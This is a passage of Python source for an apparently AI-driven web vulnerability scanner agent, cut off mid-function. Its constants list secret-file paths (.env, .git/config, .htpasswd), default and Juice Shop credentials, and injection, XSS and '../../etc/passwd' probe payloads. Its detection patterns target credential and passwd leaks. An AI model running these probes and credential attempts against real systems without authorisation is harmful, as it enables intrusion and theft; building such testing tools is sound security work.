# agents/v2_scanner.py
# =====================================================================
# VAPT-AI V2.0 — Intelligent Vulnerability Scanner Agent
# =====================================================================
# This agent tests EVERY discovered endpoint for vulnerabilities.
# It uses PayloadEngine for context-aware payloads and AI for
# response analysis.  Two-layer verification: fast programmatic
# checks first, then LLM deep analysis for ambiguous cases.
# =====================================================================

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import re
import time
import traceback
from copy import deepcopy
from dataclasses import dataclass, field, asdict
from enum import Enum
from typing import (
    Any,
    Callable,
    Coroutine,
    Dict,
    List,
    Optional,
    Set,
    Tuple,
    Union,
)
from urllib.parse import (
    parse_qs,
    quote,
    unquote,
    urlencode,
    urljoin,
    urlparse,
    urlunparse,
)

from core.http_client import SmartHTTPClient, SmartResponse
from core.browser_engine import BrowserEngine
from core.state_manager import StateManager, VulnerabilityRecord
from core.payload_engine import PayloadEngine
from core.llm_router import SmartLLMRouter

logger = logging.getLogger("vapt_ai.scanner")

# =====================================================================
# CONSTANTS
# =====================================================================

# Maximum concurrent scan tasks at any moment
MAX_CONCURRENT_SCANS: int = 10

# Maximum concurrent requests within a single test category
MAX_CONCURRENT_REQUESTS: int = 5

# Timeout for individual HTTP requests during scanning (seconds)
REQUEST_TIMEOUT: int = 15

# Time-based injection detection threshold (seconds)
TIME_BASED_THRESHOLD: float = 4.5

# Maximum number of payloads to try per parameter per attack type
MAX_PAYLOADS_PER_PARAM: int = 30

# Maximum number of parameters to test per endpoint
MAX_PARAMS_PER_ENDPOINT: int = 20

# Maximum response body size to send to LLM for analysis (chars)
MAX_RESPONSE_FOR_LLM: int = 3000

# Minimum response size difference to flag as interesting
MIN_SIZE_DIFF_RATIO: float = 0.3

# Rate limit: minimum delay between requests (seconds)
MIN_REQUEST_DELAY: float = 0.1

# Maximum number of IDOR enumeration IDs to try
MAX_IDOR_ENUM: int = 10

# Maximum number of brute-force attempts per endpoint
MAX_BRUTE_FORCE_ATTEMPTS: int = 20

# Forced browsing paths to try
FORCED_BROWSING_PATHS: List[str] = [
    "/admin",
    "/administration",
    "/#/administration",
    "/admin/panel",
    "/dashboard",
    "/api/users",
    "/api/v1/users",
    "/api/admin",
    "/api/config",
    "/api/settings",
    "/api/debug",
    "/api/swagger",
    "/api/docs",
    "/api-docs",
    "/swagger.json",
    "/swagger-ui.html",
    "/graphql",
    "/console",
    "/debug",
    "/trace",
    "/actuator",
    "/actuator/health",
    "/actuator/env",
    "/env",
    "/metrics",
    "/info",
    "/health",
    "/.env",
    "/config.json",
    "/package.json",
    "/robots.txt",
    "/sitemap.xml",
    "/.git/config",
    "/.svn/entries",
    "/backup",
    "/backup.sql",
    "/dump.sql",
    "/db.sql",
    "/database.sql",
    "/test",
    "/temp",
    "/tmp",
    "/log",
    "/logs",
    "/error.log",
    "/access.log",
    "/server-status",
    "/server-info",
    "/phpinfo.php",
    "/wp-admin",
    "/wp-login.php",
    "/.htaccess",
    "/.htpasswd",
    "/web.config",
    "/crossdomain.xml",
    "/clientaccesspolicy.xml",
    "/api/Deliveries",
    "/api/Complaints",
    "/api/Feedbacks",
    "/api/Products",
    "/api/Quantitys",
    "/api/Recycles",
    "/api/SecurityQuestions",
    "/api/SecurityAnswers",
    "/promotion",
    "/ftp",
    "/encryptionkeys",
    "/support/logs",
]

# SQL error patterns for programmatic detection
SQL_ERROR_PATTERNS: List[str] = [
    r"sql syntax.*mysql",
    r"warning.*mysql_",
    r"valid mysql result",
    r"mysqlclient\.",
    r"postgresql.*error",
    r"warning.*pg_",
    r"valid postgresql result",
    r"npgsql\.",
    r"driver.*oracle",
    r"quoted string not properly terminated",
    r"ora-\d{5}",
    r"microsoft.*odbc.*driver",
    r"microsoft.*jet.*database",
    r"sql server.*driver",
    r"warning.*mssql_",
    r"\bOLE DB\b.*\berror\b",
    r"\bjet database\b",
    r"access database engine",
    r"sqlite.*error",
    r"sqlite3\.",
    r"system\.data\.sqlite",
    r"warning.*sqlite_",
    r"unable to open database file",
    r"unrecognized token",
    r"near \".*\": syntax error",
    r"sql.*error",
    r"syntax error.*sql",
    r"unclosed quotation mark",
    r"unterminated string",
    r"you have an error in your sql",
    r"supplied argument is not a valid",
    r"division by zero",
    r"SQLSTATE\[",
]

# XSS reflection indicators
XSS_INDICATORS: List[str] = [
    "<script>",
    "javascript:",
    "onerror=",
    "onload=",
    "onclick=",
    "onmouseover=",
    "<img ",
    "<svg ",
    "<iframe ",
    "alert(",
    "prompt(",
    "confirm(",
    "document.cookie",
    "document.domain",
]

# Command injection indicators
CMD_INJECTION_INDICATORS: List[str] = [
    "root:",
    "bin/bash",
    "bin/sh",
    "uid=",
    "gid=",
    "groups=",
    "windows",
    "system32",
    "command not found",
    "no such file",
    "permission denied",
    "directory of",
    "volume serial number",
]

# Path traversal indicators
PATH_TRAVERSAL_INDICATORS: List[str] = [
    "root:x:",
    "[boot loader]",
    "[operating systems]",
    "\\windows\\system32",
    "/etc/passwd",
    "[fonts]",
    "for 16-bit app support",
    "daemon:",
    "nobody:",
    "www-data:",
]

# Sensitive data patterns
SENSITIVE_DATA_PATTERNS: Dict[str, str] = {
    "email": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
    "credit_card": r"\b(?:\d{4}[-\s]?){3}\d{4}\b",
    "ssn": r"\b\d{3}-\d{2}-\d{4}\b",
    "api_key": r"(?:api[_-]?key|apikey)[\"'\s:=]+[\"']?([a-zA-Z0-9]{16,})",
    "jwt_token": r"eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+",
    "password_field": r"(?:password|passwd|pwd|secret)[\"'\s:=]+[\"']?([^\s\"',}{]+)",
    "private_key": r"-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----",
    "aws_key": r"AKIA[0-9A-Z]{16}",
}

# Default credentials to test
DEFAULT_CREDENTIALS: List[Tuple[str, str]] = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("root", "root"),
    ("root", "toor"),
    ("test", "test"),
    ("user", "user"),
    ("guest", "guest"),
    ("admin@juice-sh.op", "admin123"),
    ("admin", "admin1234"),
    ("administrator", "administrator"),
    ("demo", "demo"),
    ("mc.safesearch@juice-sh.op", "Mr. N00dles"),
    ("jim@juice-sh.op", "ncc-1701"),
    ("bender@juice-sh.op", "OhG0dPlease1nsique"),
]


# =====================================================================
# ENUMS
# =====================================================================


class ScanCategory(str, Enum):
    """All vulnerability scan categories supported."""
    SQLI = "sqli"
    XSS = "xss"
    NOSQL = "nosql"
    CMD_INJECTION = "cmd_injection"
    IDOR = "idor"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    FORCED_BROWSING = "forced_browsing"
    AUTH_BYPASS = "auth_bypass"
    BRUTE_FORCE = "brute_force"
    DEFAULT_CREDS = "default_creds"
    PASSWORD_RESET = "password_reset"
    SESSION_FIXATION = "session_fixation"
    INPUT_VALIDATION = "input_validation"
    FILE_UPLOAD = "file_upload"
    PATH_TRAVERSAL = "path_traversal"
    XXE = "xxe"
    SSRF = "ssrf"
    JWT_ATTACK = "jwt_attack"
    SECURITY_HEADERS = "security_headers"


class Severity(str, Enum):
    """Vulnerability severity levels."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class Confidence(str, Enum):
    """How confident we are in the finding."""
    CONFIRMED = "confirmed"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    TENTATIVE = "tentative"


# =====================================================================
# DATA CLASSES
# =====================================================================


@dataclass
class ScanTarget:
    """Represents a single endpoint + parameter to scan."""
    url: str
    method: str = "GET"
    params: Dict[str, str] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)
    body: Optional[Dict[str, Any]] = None
    content_type: str = "application/json"
    requires_auth: bool = False
    endpoint_record: Optional[Dict[str, Any]] = None

    def __post_init__(self) -> None:
        self.method = self.method.upper()
        if self.params is None:
            self.params = {}
        if self.headers is None:
            self.headers = {}

    @property
    def unique_key(self) -> str:
        return f"{self.method}:{self.url}"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "method": self.method,
            "params": self.params,
            "headers": self.headers,
            "body": self.body,
            "content_type": self.content_type,
            "requires_auth": self.requires_auth,
        }


@dataclass
class TestResult:
    """Result of a single payload test against an endpoint."""
    target: ScanTarget
    category: ScanCategory
    payload: str
    parameter: str
    request_url: str
    request_method: str
    request_body: Optional[Any] = None
    request_headers: Optional[Dict[str, str]] = None
    response_status: int = 0
    response_body: str = ""
    response_headers: Optional[Dict[str, str]] = None
    response_time: float = 0.0
    response_size: int = 0
    baseline_status: int = 0
    baseline_size: int = 0
    baseline_time: float = 0.0
    is_vulnerable: bool = False
    confidence: Confidence = Confidence.TENTATIVE
    severity: Severity = Severity.INFO
    evidence: str = ""
    poc: str = ""
    error: Optional[str] = None
    ai_analysis: Optional[str] = None
    timestamp: float = field(default_factory=time.time)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "category": self.category.value if isinstance(self.category, ScanCategory) else self.category,
            "payload": self.payload,
            "parameter": self.parameter,
            "request_url": self.request_url,
            "request_method": self.request_method,
            "request_body": self.request_body,
            "response_status": self.response_status,
            "response_time": self.response_time,
            "response_size": self.response_size,
            "baseline_status": self.baseline_status,
            "baseline_size": self.baseline_size,
            "is_vulnerable": self.is_vulnerable,
            "confidence": self.confidence.value if isinstance(self.confidence, Confidence) else self.confidence,
            "severity": self.severity.value if isinstance(self.severity, Severity) else self.severity,
            "evidence": self.evidence,
            "poc": self.poc,
            "error": self.error,
            "ai_analysis": self.ai_analysis,
            "timestamp": self.timestamp,
        }


@dataclass
class BaselineResponse:
    """Captures baseline (normal) response for comparison."""
    url: str
    method: str
    status_code: int = 0
    content_length: int = 0
    response_time: float = 0.0
    body_hash: str = ""
    body_preview: str = ""
    headers: Dict[str, str] = field(default_factory=dict)
    error_count: int = 0
    captured: bool = False

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "method": self.method,
            "status_code": self.status_code,
            "content_length": self.content_length,
            "response_time": self.response_time,
            "body_hash": self.body_hash,
            "captured": self.captured,
        }


@dataclass
class ScanProgress:
    """Tracks overall scan progress."""
    total_endpoints: int = 0
    scanned_endpoints: int = 0
    total_tests: int = 0
    completed_tests: int = 0
    total_findings: int = 0
    confirmed_findings: int = 0
    potential_findings: int = 0
    categories_completed: List[str] = field(default_factory=list)
    categories_remaining: List[str] = field(default_factory=list)
    current_category: str = ""
    current_endpoint: str = ""
    start_time: float = field(default_factory=time.time)
    errors: int = 0

    @property
    def elapsed_time(self) -> float:
        return time.time() - self.start_time

    @property
    def progress_percent(self) -> float:
        if self.total_tests == 0:
            return 0.0
        return round((self.completed_tests / self.total_tests) * 100, 2)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "total_endpoints": self.total_endpoints,
            "scanned_endpoints": self.scanned_endpoints,
            "total_tests": self.total_tests,
            "completed_tests": self.completed_tests,
            "total_findings": self.total_findings,
            "confirmed_findings": self.confirmed_findings,
            "potential_findings": self.potential_findings,
            "categories_completed": self.categories_completed,
            "categories_remaining": self.categories_remaining,
            "current_category": self.current_category,
            "current_endpoint": self.current_endpoint,
            "elapsed_time": self.elapsed_time,
            "progress_percent": self.progress_percent,
            "errors": self.errors,
        }


# =====================================================================
# MAIN CLASS — VulnerabilityScanner
# =====================================================================


class VulnerabilityScanner:
    """
    Intelligent Vulnerability Scanner Agent for VAPT-AI V2.0.

    Responsibilities:
    -  Iterate over every endpoint discovered by the recon agent.
    -  For each endpoint + parameter, run a battery of injection,
       access-control, authentication, input-validation, and
       file-related tests.
    -  Use PayloadEngine for context-aware payload selection.
    -  Two-layer response analysis: fast programmatic checks first,
       then LLM deep analysis for ambiguous cases.
    -  Generate PoC for every confirmed vulnerability.
    -  Feed findings back into StateManager for attack chaining.
    -  Run tests concurrently where safe; sequential for
       destructive / stateful tests.
    """

    def __init__(
        self,
        state_manager: StateManager,
        http_client: SmartHTTPClient,
        browser_engine: BrowserEngine,
        payload_engine: PayloadEngine,
        llm_router: SmartLLMRouter,
        target_url: str,
        scan_categories: Optional[List[ScanCategory]] = None,
        max_concurrent: int = MAX_CONCURRENT_SCANS,
        max_payloads: int = MAX_PAYLOADS_PER_PARAM,
        use_ai_analysis: bool = True,
        aggressive_mode: bool = False,
    ) -> None:
        """
        Initialise the scanner.

        Args:
            state_manager:   Shared scan state / memory.
            http_client:     Async HTTP client with session support.
            browser_engine:  Playwright headless browser engine.
            payload_engine:  Context-aware payload generator.
            llm_router:      LLM router for AI response analysis.
            target_url:      Base URL of the target application.
            scan_categories: Which categories to run (None = all).
            max_concurrent:  Max concurrent scan coroutines.
            max_payloads:    Max payloads per param per attack type.
            use_ai_analysis: Whether to use LLM for deep analysis.
            aggressive_mode: If True, run more payloads & deeper tests.
        """
        # ---- dependency references ----
        self.state: StateManager = state_manager
        self.http: SmartHTTPClient = http_client
        self.browser: BrowserEngine = browser_engine
        self.payloads: PayloadEngine = payload_engine
        self.llm: SmartLLMRouter = llm_router

        # ---- target ----
        self.target_url: str = target_url.rstrip("/")
        parsed = urlparse(self.target_url)
        self.target_host: str = parsed.hostname or ""
        self.target_scheme: str = parsed.scheme or "http"

        # ---- configuration ----
        self.max_concurrent: int = max_concurrent
        self.max_payloads: int = max_payloads
        self.use_ai: bool = use_ai_analysis
        self.aggressive: bool = aggressive_mode

        # ---- determine which categories to run ----
        if scan_categories is not None:
            self.categories: List[ScanCategory] = list(scan_categories)
        else:
            self.categories = list(ScanCategory)

        # ---- concurrency controls ----
        self._semaphore: asyncio.Semaphore = asyncio.Semaphore(max_concurrent)
        self._request_semaphore: asyncio.Semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)

        # ---- internal state ----
        self._baselines: Dict[str, BaselineResponse] = {}
        self._tested_combos: Set[str] = set()
        self._findings: List[TestResult] = []
        self._all_results: List[TestResult] = []
        self._scan_targets: List[ScanTarget] = []
        self._progress: ScanProgress = ScanProgress()
        self._auth_token: Optional[str] = None
        self._auth_cookies: Dict[str, str] = {}
        self._detected_tech: Dict[str, str] = {}
        self._waf_detected: bool = False
        self._running: bool = False
        self._cancelled: bool = False

        logger.info(
            "VulnerabilityScanner initialised | target=%s | categories=%d | max_concurrent=%d | ai=%s | aggressive=%s",
            self.target_url,
            len(self.categories),
            self.max_concurrent,
            self.use_ai,
            self.aggressive,
        )

    # =================================================================
    # SETUP / PREPARATION METHODS
    # =================================================================

    async def _setup(self) -> None:
        """
        Run all preparation steps before scanning begins.
        1. Load auth credentials from state.
        2. Build scan target list from endpoints.
        3. Capture baselines for every unique URL.
        4. Detect technologies / WAF.
        """
        logger.info("Scanner setup starting...")
        self._running = True
        self._cancelled = False
        self.state.set_scan_status("scanning")

        # Step 1: load authentication
        await self._load_auth()

        # Step 2: build scan targets
        self._build_scan_targets()

        # Step 3: capture baselines
        await self._capture_baselines()

        # Step 4: detect tech / WAF
        await self._detect_environment()

        # Step 5: initialise progress tracking
        self._init_progress()

        logger.info(
            "Scanner setup complete | targets=%d | baselines=%d | auth=%s | waf=%s",
            len(self._scan_targets),
            len(self._baselines),
            bool(self._auth_token or self._auth_cookies),
            self._waf_detected,
        )

    async def _load_auth(self) -> None:
        """
        Load authentication token and cookies from state manager.
        Apply them to the HTTP client so all subsequent requests
        are authenticated.
        """
        token = self.state.get_authenticated_token()
        if token:
            self._auth_token = token
            self.http.set_auth_token(token, "Bearer")
            logger.info("Loaded auth token from state (Bearer)")

        cookies = self.state.get_authenticated_cookies()
        if cookies:
            self._auth_cookies = cookies
            self.http.set_cookies(cookies)
            logger.info("Loaded %d auth cookies from state", len(cookies))

        if not token and not cookies:
            logger.warning("No authentication credentials found in state — running unauthenticated scans")

    def _build_scan_targets(self) -> None:
        """
        Convert every endpoint in state_manager into ScanTarget objects.
        Each target captures URL, method, parameters, body, etc.
        """
        endpoints = self.state.get_all_endpoints()
        if not endpoints:
            logger.warning("No endpoints found in state — nothing to scan")
            return

        seen_keys: Set[str] = set()

        for ep in endpoints:
            url = ep.get("url", "")
            if not url:
                continue

            method = ep.get("method", "GET").upper()
            params = ep.get("params", {}) or {}
            body = ep.get("body") or ep.get("request_body")
            content_type = ep.get("content_type", "application/json")
            requires_auth = ep.get("requires_auth", False)

            # Build full URL if relative
            if not url.startswith(("http://", "https://")):
                url = urljoin(self.target_url + "/", url.lstrip("/"))

            # Extract query-string parameters
            parsed = urlparse(url)
            qs_params = parse_qs(parsed.query, keep_blank_values=True)
            for k, v in qs_params.items():
                if k not in params:
                    params[k] = v[0] if v else ""

            # Clean URL (remove query string, we track params separately)
            clean_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                "",
                "",
                "",
            ))

            # Parse body parameters for POST/PUT/PATCH
            body_params: Dict[str, Any] = {}
            if body:
                if isinstance(body, dict):
                    body_params = body
                elif isinstance(body, str):
                    try:
                        body_params = json.loads(body)
                    except (json.JSONDecodeError, TypeError):
                        # Try form-encoded
                        parsed_body = parse_qs(body, keep_blank_values=True)
                        body_params = {k: v[0] if v else "" for k, v in parsed_body.items()}

            # Deduplicate
            unique_key = f"{method}:{clean_url}:{json.dumps(sorted(params.items()))}:{json.dumps(sorted(body_params.items()) if body_params else [])}"
            if unique_key in seen_keys:
                continue
            seen_keys.add(unique_key)

            target = ScanTarget(
                url=clean_url,
                method=method,
                params=params,
                body=body_params if body_params else None,
                content_type=content_type,
                requires_auth=requires_auth,
                endpoint_record=ep,
            )
            self._scan_targets.append(target)

        logger.info("Built %d scan targets from %d endpoints", len(self._scan_targets), len(endpoints))

    async def _capture_baselines(self) -> None:
        """
        For every unique URL+method in scan targets, send a
        normal (no payload) request and record the baseline
        response characteristics: status code, body length,
        response time, body hash.

        Baselines are used later to detect anomalies when
        payloads are injected.
        """
        unique_urls: Dict[str, ScanTarget] = {}
        for target in self._scan_targets:
            key = f"{target.method}:{target.url}"
            if key not in unique_urls:
                unique_urls[key] = target

        logger.info("Capturing baselines for %d unique URL+method combos", len(unique_urls))

        tasks: List[Coroutine] = []
        keys: List[str] = []
        for key, target in unique_urls.items():
            tasks.append(self._capture_single_baseline(target))
            keys.append(key)

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for key, result in zip(keys, results):
            if isinstance(result, BaselineResponse):
                self._baselines[key] = result
            elif isinstance(result, Exception):
                logger.warning("Baseline capture failed for %s: %s", key, str(result))
                # Store a minimal baseline so scanning can still proceed
                parts = key.split(":", 1)
                self._baselines[key] = BaselineResponse(
                    url=parts[1] if len(parts) > 1 else key,
                    method=parts[0] if parts else "GET",
                    captured=False,
                )

        logger.info("Baselines captured: %d / %d", sum(1 for b in self._baselines.values() if b.captured), len(unique_urls))

    async def _capture_single_baseline(self, target: ScanTarget) -> BaselineResponse:
        """Capture baseline for one target."""
        baseline = BaselineResponse(url=target.url, method=target.method)

        try:
            async with self._request_semaphore:
                if target.method in ("GET", "HEAD", "OPTIONS"):
                    resp = await self.http.request(
                        method=target.method,
                        url=target.url,
                        params=target.params if target.params else None,
                        timeout=REQUEST_TIMEOUT,
                    )
                else:
                    resp = await self.http.request(
                        method=target.method,
                        url=target.url,
                        json_data=target.body,
                        timeout=REQUEST_TIMEOUT,
                    )

                self.state.increment_requests()

                baseline.status_code = resp.status_code
                baseline.content_length = resp.content_length
                baseline.response_time = resp.response_time
                baseline.body_hash = hashlib.md5(resp.text.encode("utf-8", errors="replace")).hexdigest()
                baseline.body_preview = resp.text[:500] if resp.text else ""
                baseline.headers = dict(resp.headers) if resp.headers else {}
                baseline.captured = True

        except Exception as exc:
            logger.debug("Baseline capture error for %s %s: %s", target.method, target.url, str(exc))
            baseline.captured = False

        return baseline

    async def _detect_environment(self) -> None:
        """
        Detect technologies, frameworks, WAF presence by
        analysing baseline responses and sending specific probes.
        """
        # Check state for already detected tech
        target_info = self.state.get_target_info()
        if target_info.get("technologies"):
            self._detected_tech = target_info["technologies"] if isinstance(target_info["technologies"], dict) else {}

        # WAF detection: send a clearly malicious payload and see
        # if we get blocked (403, 406, 429, custom block page)
        waf_test_payloads = [
            "' OR 1=1--",
            "<script>alert(1)</script>",
            "../../etc/passwd",
        ]

        for payload in waf_test_payloads:
            try:
                async with self._request_semaphore:
                    resp = await self.http.get(
                        f"{self.target_url}/nonexistent_waf_test_page",
                        params={"test": payload},
                        timeout=REQUEST_TIMEOUT,
                    )
                    self.state.increment_requests()

                    if resp.status_code in (403, 406, 429, 503):
                        body_lower = resp.text.lower() if resp.text else ""
                        waf_indicators = [
                            "blocked", "forbidden", "waf", "firewall",
                            "security", "access denied", "not acceptable",
                            "cloudflare", "akamai", "imperva", "sucuri",
                            "mod_security", "modsecurity",
                        ]
                        if any(ind in body_lower for ind in waf_indicators):
                            self._waf_detected = True
                            logger.warning("WAF detected! Will use evasion payloads where possible.")
                            break

            except Exception:
                pass

    def _init_progress(self) -> None:
        """Initialise progress tracking."""
        self._progress = ScanProgress(
            total_endpoints=len(self._scan_targets),
            categories_remaining=[c.value for c in self.categories],
            start_time=time.time(),
        )

        # Estimate total tests
        param_count = 0
        for target in self._scan_targets:
            p = len(target.params or {})
            if target.body and isinstance(target.body, dict):
                p += len(target.body)
            param_count += max(p, 1)

        # Rough estimate: categories × parameters × avg payloads
        injection_categories = [ScanCategory.SQLI, ScanCategory.XSS, ScanCategory.NOSQL, ScanCategory.CMD_INJECTION]
        injection_count = len([c for c in self.categories if c in injection_categories])
        other_count = len(self.categories) - injection_count

        estimated_tests = (injection_count * param_count * min(self.max_payloads, 15)) + (other_count * len(self._scan_targets) * 5)
        self._progress.total_tests = max(estimated_tests, 1)

    # =================================================================
    # UTILITY / HELPER METHODS
    # =================================================================

    def _is_tested(self, endpoint_url: str, category: ScanCategory, parameter: str = "", payload_hash: str = "") -> bool:
        """
        Check if a specific endpoint + category + parameter + payload
        combination has already been tested in this session.
        """
        combo_key = f"{category.value}:{endpoint_url}:{parameter}:{payload_hash}"
        if combo_key in self._tested_combos:
            return True
        # Also check persistent state
        if self.state.is_endpoint_tested(endpoint_url, category.value):
            if not parameter and not payload_hash:
                return True
        return False

    def _mark_tested(self, endpoint_url: str, category: ScanCategory, parameter: str = "", payload_hash: str = "") -> None:
        """Mark a test combination as completed."""
        combo_key = f"{category.value}:{endpoint_url}:{parameter}:{payload_hash}"
        self._tested_combos.add(combo_key)

    def _get_baseline(self, target: ScanTarget) -> BaselineResponse:
        """Get the baseline response for a target."""
        key = f"{target.method}:{target.url}"
        if key in self._baselines:
            return self._baselines[key]
        return BaselineResponse(url=target.url, method=target.method, captured=False)

    def _get_all_parameters(self, target: ScanTarget) -> Dict[str, Tuple[str, str]]:
        """
        Extract all testable parameters from a target.
        Returns dict of param_name -> (param_value, location).
        Location is 'query', 'body', or 'path'.
        """
        params: Dict[str, Tuple[str, str]] = {}

        # Query parameters
        if target.params:
            for k, v in target.params.items():
                val = v if isinstance(v, str) else str(v)
                params[k] = (val, "query")

        # Body parameters
        if target.body and isinstance(target.body, dict):
            for k, v in target.body.items():
                val = v if isinstance(v, str) else json.dumps(v) if isinstance(v, (dict, list)) else str(v)
                params[k] = (val, "body")

        # Path parameters (detect patterns like /api/users/1)
        parsed = urlparse(target.url)
        path_parts = parsed.path.strip("/").split("/")
        for i, part in enumerate(path_parts):
            if part.isdigit():
                params[f"__path_{i}__"] = (part, "path")
            elif re.match(r"^[a-f0-9]{24}$", part):
                # MongoDB ObjectId
                params[f"__path_{i}__"] = (part, "path")
            elif re.match(r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$", part, re.IGNORECASE):
                # UUID
                params[f"__path_{i}__"] = (part, "path")

        # Limit
        if len(params) > MAX_PARAMS_PER_ENDPOINT:
            limited: Dict[str, Tuple[str, str]] = {}
            count = 0
            for k, v in params.items():
                if count >= MAX_PARAMS_PER_ENDPOINT:
                    break
                limited[k] = v
                count += 1
            return limited

        return params

    def _build_payload_context(self, target: ScanTarget, parameter: str) -> Dict[str, Any]:
        """
        Build a context dict to pass to PayloadEngine.get_payloads()
        so it returns the most relevant payloads.
        """
        context: Dict[str, Any] = {
            "url": target.url,
            "method": target.method,
            "parameter": parameter,
            "content_type": target.content_type,
            "target_url": self.target_url,
        }

        # Add detected technologies
        if self._detected_tech:
            context["technologies"] = self._detected_tech

        # Add WAF info
        if self._waf_detected:
            context["waf_detected"] = True

        # Add any existing findings for this endpoint
        existing_findings = self.state.get_findings_by_endpoint(target.url)
        if existing_findings:
            context["existing_findings"] = [f.get("category", "") for f in existing_findings]

        # Check if endpoint accepts JSON
        if target.content_type and "json" in target.content_type.lower():
            context["accepts_json"] = True

        # Check if endpoint accepts XML
        if target.content_type and "xml" in target.content_type.lower():
            context["accepts_xml"] = True

        return context

    async def _send_payload(
        self,
        target: ScanTarget,
        parameter: str,
        param_location: str,
        payload: str,
        original_value: str = "",
    ) -> Optional[SmartResponse]:
        """
        Send a single payload in the specified parameter.
        Handles query, body, and path parameter injection.
        Returns the SmartResponse or None on error.
        """
        try:
            async with self._request_semaphore:
                await asyncio.sleep(MIN_REQUEST_DELAY)

                if param_location == "query":
                    modified_params = dict(target.params) if target.params else {}
                    modified_params[parameter] = payload

                    resp = await self.http.request(
                        method=target.method,
                        url=target.url,
                        params=modified_params,
                        json_data=target.body,
                        timeout=REQUEST_TIMEOUT,
                    )

                elif param_location == "body":
                    modified_body = dict(target.body) if target.body else {}
                    modified_body[parameter] = payload

                    resp = await self.http.request(
                        method=target.method,
                        url=target.url,
                        params=target.params if target.params else None,
                        json_data=modified_body,
                        timeout=REQUEST_TIMEOUT,
                    )

                elif param_location == "path":
                    # Replace path segment
                    parsed = urlparse(target.url)
                    path_parts = parsed.path.strip("/").split("/")
                    # Extract index from __path_N__
                    match = re.match(r"__path_(\d+)__", parameter)
                    if match:
                        idx = int(match.group(1))
                        if 0 <= idx < len(path_parts):
                            path_parts[idx] = str(payload)

                    modified_path = "/" + "/".join(path_parts)
                    modified_url = urlunparse((
                        parsed.scheme,
                        parsed.netloc,
                        modified_path,
                        parsed.params,
                        parsed.query,
                        parsed.fragment,
                    ))

                    resp = await self.http.request(
                        method=target.method,
                        url=modified_url,
                        params=target.params if target.params else None,
                        json_data=target.body,
                        timeout=REQUEST_TIMEOUT,
                    )
                else:
                    # Default: send as query param
                    resp = await self.http.request(
                        method=target.method,
                        url=target.url,
                        params={parameter: payload},
                        timeout=REQUEST_TIMEOUT,
                    )

                self.state.increment_requests()
                return resp

        except Exception as exc:
            logger.debug("Payload send error: %s %s param=%s payload=%s err=%s",
                         target.method, target.url, parameter, payload[:50], str(exc))
            return None

    async def _send_raw_request(
        self,
        method: str,
        url: str,
        params: Optional[Dict[str, str]] = None,
        json_data: Optional[Any] = None,
        headers: Optional[Dict[str, str]] = None,
        data: Optional[Any] = None,
        timeout: int = REQUEST_TIMEOUT,
    ) -> Optional[SmartResponse]:
        """Send a raw HTTP request with full control over parameters."""
        try:
            async with self._request_semaphore:
                await asyncio.sleep(MIN_REQUEST_DELAY)

                resp = await self.http.request(
                    method=method,
                    url=url,
                    params=params,
                    json_data=json_data,
                    headers=headers,
                    data=data,
                    timeout=timeout,
                )
                self.state.increment_requests()
                return resp

        except Exception as exc:
            logger.debug("Raw request error: %s %s err=%s", method, url, str(exc))
            return None

    def _generate_poc(
        self,
        target: ScanTarget,
        category: ScanCategory,
        parameter: str,
        param_location: str,
        payload: str,
        response: Optional[SmartResponse] = None,
    ) -> str:
        """
        Generate a Proof-of-Concept string for a confirmed finding.
        Returns a curl command or HTTP request that reproduces
        the vulnerability.
        """
        parts: List[str] = ["curl -v"]

        # Method
        if target.method != "GET":
            parts.append(f"-X {target.method}")

        # Auth headers
        if self._auth_token:
            parts.append(f'-H "Authorization: Bearer {self._auth_token}"')

        # Cookies
        if self._auth_cookies:
            cookie_str = "; ".join(f"{k}={v}" for k, v in self._auth_cookies.items())
            parts.append(f'-H "Cookie: {cookie_str}"')

        # Content type for POST/PUT/PATCH
        if target.method in ("POST", "PUT", "PATCH"):
            parts.append(f'-H "Content-Type: {target.content_type}"')

        # Build URL with payload
        if param_location == "query":
            modified_params = dict(target.params) if target.params else {}
            modified_params[parameter] = payload
            query_string = urlencode(modified_params)
            full_url = f"{target.url}?{query_string}" if query_string else target.url
            parts.append(f'"{full_url}"')

        elif param_location == "body":
            modified_body = dict(target.body) if target.body else {}
            modified_body[parameter] = payload
            if "json" in target.content_type.lower():
                parts.append(f"-d '{json.dumps(modified_body)}'")
            else:
                parts.append(f"-d '{urlencode(modified_body)}'")
            parts.append(f'"{target.url}"')

        elif param_location == "path":
            parsed = urlparse(target.url)
            path_parts = parsed.path.strip("/").split("/")
            match = re.match(r"__path_(\d+)__", parameter)
            if match:
                idx = int(match.group(1))
                if 0 <= idx < len(path_parts):
                    path_parts[idx] = str(payload)
            modified_path = "/" + "/".join(path_parts)
            modified_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                modified_path,
                "",
                "",
                "",
            ))
            parts.append(f'"{modified_url}"')
        else:
            parts.append(f'"{target.url}?{parameter}={quote(str(payload))}"')

        poc = " \\\n  ".join(parts)

        # Add response info if available
        if response:
            poc += f"\n\n# Response Status: {response.status_code}"
            poc += f"\n# Response Size: {response.content_length} bytes"
            poc += f"\n# Response Time: {response.response_time:.2f}s"

        return poc

    def _record_finding(
        self,
        result: TestResult,
    ) -> None:
        """
        Record a vulnerability finding in both internal list
        and persistent state manager.
        """
        self._findings.append(result)

        if result.is_vulnerable:
            if result.confidence in (Confidence.CONFIRMED, Confidence.HIGH):
